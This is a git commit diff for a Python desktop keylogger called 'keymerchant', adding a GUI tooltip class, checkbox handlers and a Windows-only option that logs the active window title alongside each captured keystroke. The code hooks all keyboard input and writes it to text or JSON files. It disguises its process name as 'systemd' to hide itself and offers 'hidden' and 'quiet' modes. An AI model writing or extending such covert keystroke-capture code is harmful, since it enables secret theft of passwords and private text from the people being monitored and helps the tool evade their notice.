ff72aef6887d5ef05400e2ca7074986bafe0c976
Shota Oniani <103844303+onianis@users.noreply.github.com>
2025-05-05 01:39:00 +0400

    Updated files to match 0.1b

--- keymerchant_utils.py
+++ keymerchant_utils.py
@@ -1,6 +1,6 @@
 import customtkinter
+import tkinter
 from enum import Enum
-
 
 
 class Logic:
@@ -24,8 +24,8 @@ class GuiUtils:
 
 
     class Elements:
-        def __init__(self, frame, root, start, stop, modes):
-            self.program_title = customtkinter.CTkLabel(frame, text = 'keymerchant 0.4a',
+        def __init__(self, frame, root, start, stop, modes, checkbox):
+            self.program_title = customtkinter.CTkLabel(frame, text = 'keymerchant 0.5a',
                 text_color = '#E8E8E8', justify = 'left', padx = 0, pady = 0, font = ('Nacelle Light', 20))
 
             self.start_button = customtkinter.CTkButton(frame, text = 'start logging',
@@ -43,13 +43,39 @@ class GuiUtils:
                 width = 100, font = ('Nacelle Light', 14), dropdown_font = ('Nacelle Light', 12), justify = 'right')
 
             self.hidden_mode_checkbox = customtkinter.CTkCheckBox(frame, text = 'hidden mode', onvalue = 'on',
-                offvalue = 'off', width = 100, text_color = '#E8E8E8', font = ('Nacelle Light', 15))
+                offvalue = 'off', width = 100, text_color = '#E8E8E8', font = ('Nacelle Light', 15), command = lambda: checkbox('H'))
 
             self.quiet_mode_checkbox = customtkinter.CTkCheckBox(frame, text='quiet mode', onvalue='on',
-                offvalue='off', width=100, text_color='#E8E8E8', font = ('Nacelle Light', 15))
+                offvalue='off', width=100, text_color='#E8E8E8', font = ('Nacelle Light', 15), command = lambda: checkbox('Q'))
 
             self.context_logging_checkbox = customtkinter.CTkCheckBox(frame, text = 'context logging', onvalue = 'on',
-                offvalue = 'off', width = 100, text_color = '#E8E8E8', font = ('Nacelle Light', 15))
+                offvalue = 'off', width = 100, text_color = '#E8E8E8', font = ('Nacelle Light', 15), command = lambda: checkbox('C'))
 
             self.quote_label = customtkinter.CTkLabel(root, text = 'mystify, mislead, surprise', text_color = '#B8B8B8',
                 justify = 'center', padx = 0, pady = 0, font = ('Nacelle Medium', 10, 'italic'))
+
+
+
+    class CustomTooltip:
+        def __init__(self, widget, text):
+            self.widget = widget
+            self.text = text
+            self.widget.bind("<Enter>", self.enter)
+            self.widget.bind("<Leave>", self.leave)
+            self.tooltip_window = None
+
+        def enter(self, event=None):
+            x, y, cx, cy = self.widget.bbox("insert")
+            x += self.widget.winfo_rootx() + 25
+            y += self.widget.winfo_rooty() + 20
+            self.tooltip_window = tkinter.Toplevel(self.widget)
+            self.tooltip_window.wm_overrideredirect(True)
+            self.tooltip_window.wm_geometry("+%d+%d" % (x, y))
+            label = tkinter.Label(self.tooltip_window, text=self.text, justify='left',
+                             background='#ffffff', relief='solid', borderwidth=1,
+                             font=("tahoma", "8", "normal"))
+            label.pack(ipadx=1)
+
+        def leave(self, event=None):
+            if self.tooltip_window:
+                self.tooltip_window.destroy()
--- km.py
+++ km.py
@@ -1,26 +1,27 @@
-import keyboard
-import json
-import setproctitle
-import customtkinter
+import keyboard, json, setproctitle, sys, customtkinter
 # attempt to hide process? have to check if it actually works
 setproctitle.setproctitle('systemd')
 
 from tkinter import *
 from datetime import datetime
 from keymerchant_utils import Logic, GuiUtils
+from win32gui import GetWindowText, GetForegroundWindow
 
 
 
-KBLISTEN = None
-OUTPUT_STREAM = None
-CURRENTLY_LISTENING = False
+# const-variable notation is used loosely here -
+#   these variables are all simply globally defined variables
+#   and ARE MODIFIED in the flow of the program
+KBLISTEN, OUTPUT_STREAM = None, None
+QUIET_MODE, HIDDEN_MODE, CURRENTLY_LISTENING, CONTEXT_LOGGING = False, False, False, False
+LOGGING_MODE = Logic.LoggingModes.OFF
 # Preparing dictionary in case of JSON output choice by user
 JSON_OUTPUT_DICT = {'INTRO': '', 'KEYSTROKES': [], 'OUTRO': ''}
-LOGGING_MODE = Logic.LoggingModes.OFF
 
 # Declaring Tkinter button names globally so that they can be disabled / enabled
 #       by the appropriate functions
-START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX = None, None, None
+START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX, QUIET_MODE_CHECKBOX = None, None, None, None
+
 
 
 # Callback function called by the keyboard.on_press() hook
@@ -33,19 +34,28 @@ def handle_event(event):
     single_log_operation(event_data)
 
 
+
 # Get data about key event from the on_press() callback handler
 # If necessary, process it and log it according to the two logging types
 def single_log_operation(event):
-    global LOGGING_MODE, OUTPUT_STREAM
+    global LOGGING_MODE, OUTPUT_STREAM, CONTEXT_LOGGING
 
     if OUTPUT_STREAM is not None:
         if LOGGING_MODE == Logic.LoggingModes.TXT:
-            OUTPUT_STREAM.write(f"{f'{event['name']:<15}' + f'{'---':<15}{event['timestamp']}\n'}")
+            if CONTEXT_LOGGING:
+                OUTPUT_STREAM.write(f"{f'{event['name']:<15}' + f'{'---':<10}{event['timestamp']}' + 
+                    f'{'':<5}{'---':<10}{GetWindowText(GetForegroundWindow())}\n'}")
+            else:
+                OUTPUT_STREAM.write(f"{f'{event['name']:<15}' + f'{'---':<10}{event['timestamp']}\n'}")
             # Flush stream immediately
             OUTPUT_STREAM.flush()
         elif LOGGING_MODE == Logic.LoggingModes.JSON:
             # Stream flushing not possible. See start_logging() function
-            JSON_OUTPUT_DICT['KEYSTROKES'].append({'key': event['name'], 'timestamp': event['timestamp']})
+            if CONTEXT_LOGGING:
+                JSON_OUTPUT_DICT['KEYSTROKES'].append({'key': event['name'],
+                    'timestamp': event['timestamp'], 'window': GetWindowText(GetForegroundWindow())})
+            else:
+                JSON_OUTPUT_DICT['KEYSTROKES'].append({'key': event['name'], 'timestamp': event['timestamp']})
 
 
 
@@ -54,6 +64,7 @@ def start_logging():
     # Change button and field states to safeguard against unexpected user behavior
     START_BUTTON.configure(state = 'disabled')
     STOP_BUTTON.configure(state = 'normal')
+    LOGGING_MODE_BOX.configure(state = 'disabled')
     #TODO --- ADD STATE MODIFICATION FOR CTK.COMBOBOX
 
 
@@ -100,7 +111,9 @@ def stop_logging():
     # Change button and field states to safeguard against unexpected user behavior
     START_BUTTON.configure(state='normal')
     STOP_BUTTON.configure(state='disabled')
+    LOGGING_MODE_BOX.configure(state='readonly')
     # TODO --- ADD STATE MODIFICATION FOR CTK.COMBOBOX
+
 
     # Stop listener
     keyboard.unhook(KBLISTEN)
@@ -123,22 +136,52 @@ def stop_logging():
 
 
 
+def checkbox_handler(box_id):
+    global HIDDEN_MODE, QUIET_MODE, QUIET_MODE_CHECKBOX
+    match box_id:
+        case 'H':
+            # quiet mode cannot be disabled when hidden mode is enabled -
+            #   handle logic and boolean operations accordingly
+            HIDDEN_MODE = not HIDDEN_MODE
+            if HIDDEN_MODE:
+                if not QUIET_MODE:
+                    QUIET_MODE_CHECKBOX.toggle()
+                    QUIET_MODE_CHECKBOX.configure(state='disabled')
+            else:
+                QUIET_MODE_CHECKBOX.configure(state='normal')
+                QUIET_MODE_CHECKBOX.toggle()
+            print(f'hidden: {HIDDEN_MODE}')
+
+        case 'Q':
+            QUIET_MODE = not QUIET_MODE
+            print(f'quiet: {QUIET_MODE}')
+
+        case 'C':
+            global CONTEXT_LOGGING
+            CONTEXT_LOGGING = not CONTEXT_LOGGING
+            print(f'context logging: {CONTEXT_LOGGING}')
+        case _:
+            print(f'Illegal argument passed to function: {box_id}')
+
+
+
 def main():
     root = customtkinter.CTk()
-    root.title('keymerchant 0.4a')
+    root.title('kmrcht 0.5a')
     root.geometry('250x300')
     root.resizable(width=False, height=False)
     root.columnconfigure(0, weight=1)
     root.rowconfigure(0, weight=1)
     root.configure(fg_color = '#0A0A0A')
+    root.iconbitmap('lavender.ico')
 
     frame = customtkinter.CTkFrame(root, fg_color = '#0A0A0A')
     frame.grid(column = 0, row = 0, sticky = (N, W, E, S), padx = 10, pady = 10)
 
     logging_modes = [mode.name for mode in Logic.LoggingModes]
 
-    global START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX
-    gui_set = GuiUtils.Elements(frame, root, start_logging, stop_logging, logging_modes)
+    global START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX, QUIET_MODE_CHECKBOX
+    gui_set = GuiUtils.Elements(frame, root, start_logging, stop_logging, logging_modes, checkbox_handler)
 
     program_title = gui_set.program_title
     program_title.place(relx = 0.0, rely = 0.0, anchor = NW)
@@ -159,11 +202,15 @@ def main():
     hidden_mode_checkbox = gui_set.hidden_mode_checkbox
     hidden_mode_checkbox.place(relx = 0, rely = 0.50, anchor = W)
 
-    quiet_mode_checkbox = gui_set.quiet_mode_checkbox
-    quiet_mode_checkbox.place(relx=0, rely=0.62, anchor=W)
+    QUIET_MODE_CHECKBOX = gui_set.quiet_mode_checkbox
+    QUIET_MODE_CHECKBOX.place(relx=0, rely=0.62, anchor=W)
 
     context_logging_checkbox = gui_set.context_logging_checkbox
     context_logging_checkbox.place(relx = 0, rely = 0.74, anchor = W)
+    if sys.platform != 'win32':
+        context_logging_checkbox.configure(state = 'disabled')
+        context_logging_tooltip = GuiUtils.CustomTooltip(context_logging_checkbox,
+            "context logging is only available on Windows (thanks modern linux)")
 
     quote_label = gui_set.quote_label
     quote_label.place(relx = 0.04, rely = 1, anchor = SW)
